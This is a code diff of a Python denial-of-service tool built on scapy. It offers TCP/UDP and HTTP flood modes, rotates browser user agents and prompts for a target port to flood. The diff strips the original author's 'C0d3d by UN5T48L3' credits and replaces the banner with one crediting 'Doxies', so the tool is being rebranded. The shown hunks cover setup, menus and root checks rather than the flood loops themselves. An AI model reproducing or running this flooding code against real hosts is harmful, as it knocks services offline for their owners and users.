@@ -10,26 +10,33 @@ import sys
 from bs4 import BeautifulSoup
 
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # C0d3d by UN5T48L3
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-if sys.platform.startswith("linux"): # C0d3d by UN5T48L3
-	from scapy.all import * # C0d3d by UN5T48L3
-elif sys.platform.startswith("freebsd"): # C0d3d by UN5T48L3
-	from scapy.all import * # C0d3d by UN5T48L3
+if sys.platform.startswith("linux"):
+	from scapy.all import * 
+elif sys.platform.startswith("freebsd"): 
+	from scapy.all import * 
 else: # C0d3d by UN5T48L3
-	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # C0d3d by UN5T48L3
+	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") 
 
 print('''
 
-UU   UU NN   NN 555555  TTTTTTT     44    88888  LL      333333  
-UU   UU NNN  NN 55        TTT      444   88   88 LL         3333 
-UU   UU NN N NN 555555    TTT    44  4    88888  LL        3333  
-UU   UU NN  NNN    5555   TTT   44444444 88   88 LL          333 
- UUUUU  NN   NN 555555    TTT      444    88888  LLLLLLL 333333  
+
+ ▄▄▄▄    ▒█████   ▒█████  ▄▄▄█████▓▓█████  ██▀███  
+▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
+▒██▒ ▄██▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
+▒██░█▀  ▒██   ██░▒██   ██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
+░▓█  ▀█▓░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
+░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
+▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░     ░     ░ ░  ░  ░▒ ░ ▒░
+ ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░         ░     ░░   ░ 
+ ░          ░ ░      ░ ░              ░  ░   ░     
+      ░                                            
 
 
-							C0d3d by UN5T48L3
-	''') # her nefis bir gün DDoS'u tadacaktır
+
+							C0d3d by Doxies
+	''') 
 
 useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
@@ -53,7 +60,7 @@ useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
 
 
-def starturl(): # C0d3d by UN5T48L3
+def starturl(): 
 	global url
 	global url2
 	global urlport
@@ -95,19 +102,19 @@ def floodmode():
 	elif choice1 == "1":
 		try:
 			if os.getuid() != 0: # C0d3d by UN5T48L3
-				print("You need to run this program as root to use TCP/UDP flooding.") # C0d3d by UN5T48L3
-				exit(0) # C0d3d by UN5T48L3
-			else: # C0d3d by UN5T48L3
-				floodport() # C0d3d by UN5T48L3
+				print("You need to run this program as root to use TCP/UDP flooding.") 
+				exit(0) 
+			else: 
+				floodport() 
 		except:
 			pass
 	elif choice1 == "2":
 		try:
-			if os.getuid() != 0: # C0d3d by UN5T48L3
-				print("You need to run this program as root to use TCP/UDP flooding.") # C0d3d by UN5T48L3
-				exit(0) # C0d3d by UN5T48L3
+			if os.getuid() != 0:
+				print("You need to run this program as root to use TCP/UDP flooding.")
+				exit(0) 
 			else: # 
-				floodport() # C0d3d by UN5T48L3
+				floodport()
 		except:
 			pass
 	else:
@@ -118,8 +125,8 @@ def floodport():
 	global port
 	try:
 		port = int(input("Enter the port you want to flood: "))
-		portlist = range(65535) # C0d3d by UN5T48L3
-		if port in portlist: # C0d3d by UN5T48L3
+		portlist = range(65535) 
+		if port in portlist: 
 			pass # C0d3d by UN5T48L3
 		else: # C0d3d by UN5T48L3
 			print ("You mistyped, try again.")
